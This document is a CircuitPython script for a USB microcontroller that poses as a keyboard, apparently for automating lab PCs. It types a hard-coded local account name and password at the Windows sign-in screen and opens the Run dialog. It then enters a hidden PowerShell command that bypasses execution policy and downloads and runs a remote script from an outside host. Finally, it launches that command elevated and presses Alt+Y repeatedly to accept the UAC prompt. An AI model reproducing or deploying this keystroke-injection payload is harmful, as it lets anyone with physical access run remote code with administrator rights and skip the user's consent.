import time
import gc
import board
import digitalio
import usb_hid

# --- SAFETY DELAY ---
# Wait for Windows to finish mounting the drive and settling autoplay
time.sleep(8.0)

# --- MEMORY CLEANUP ---
gc.collect()

# --- IMPORT HID DRIVERS ---
try:
    from adafruit_hid.keyboard import Keyboard
    from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
    from adafruit_hid.keycode import Keycode
except ImportError:
    while True:
        time.sleep(0.1)

# --- LED SETUP ---
led_pin = board.LED if hasattr(board, "LED") else (board.GP25 if hasattr(board, "GP25") else board.GP23)
led = digitalio.DigitalInOut(led_pin)
led.direction = digitalio.Direction.OUTPUT

# --- HID SETUP ---
try:
    kbd = Keyboard(usb_hid.devices)
    layout = KeyboardLayoutUS(kbd)
except Exception:
    while True:
        led.value = not led.value
        time.sleep(0.15)

# --- PAYLOAD ---
led.value = True

# 1. Dismiss any UI overlay and activate the sign-in credential input.
#    The device assumes the PC is already at the Windows sign-in screen
#    (no user logged in). On domain-joined PCs this shows an "Other user"
#    field (username + password) that accepts .\student directly.
kbd.press(Keycode.ESCAPE)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.0)

# 2. Type username
layout.write(".\\student")

# 3. Move to password field
kbd.press(Keycode.TAB)
time.sleep(0.1)
kbd.release_all()
time.sleep(0.3)

# 4. Type password
layout.write("student")

# 5. Submit
kbd.press(Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 6. Wait for login and desktop to settle before triggering the launch script
time.sleep(10.0)

# 7. Minimize all windows so Run dialog opens cleanly
kbd.press(Keycode.GUI, Keycode.D)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.0)

# 8. Open Run dialog
kbd.press(Keycode.GUI, Keycode.R)
time.sleep(0.1)
kbd.release_all()
time.sleep(1.5)

# 9. Type the launch command — downloads and runs Launch.ps1 from R2.
#    Ctrl+Shift+Enter (step 10) runs this elevated — one UAC prompt total.
layout.write("powershell -W Hidden -ExecutionPolicy Bypass -C \"iex (irm 'https://ta-chip.lrxrn.dev/Launch.ps1')\"")

# 10. Elevated launch via Ctrl+Shift+Enter → triggers UAC
time.sleep(0.5)
kbd.press(Keycode.LEFT_CONTROL, Keycode.LEFT_SHIFT, Keycode.ENTER)
time.sleep(0.1)
kbd.release_all()

# 11. Accept UAC — first attempt at 1.5 s (UAC appears within ~1 s),
#     then 3 more attempts at 2.5 s apart in case of slow render.
#     Extra presses after dismissal land on a hidden window and are harmless.
time.sleep(1.5)
kbd.press(Keycode.ALT, Keycode.Y)
time.sleep(0.1)
kbd.release_all()
for _ in range(3):
    time.sleep(2.5)
    kbd.press(Keycode.ALT, Keycode.Y)
    time.sleep(0.1)
    kbd.release_all()

led.value = False
